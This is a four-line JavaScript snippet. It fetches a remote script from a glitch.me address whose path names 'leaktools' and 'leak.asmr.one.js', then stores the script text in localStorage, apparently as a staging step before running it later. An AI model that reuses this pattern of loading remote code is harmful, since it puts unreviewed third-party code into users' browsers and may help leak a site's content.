const script = await (
	await fetch('https://nhdasmr-v2-2.glitch.me/dev/leaktools/leak.asmr.one.js')
).text();
localStorage.setItem('l', script);
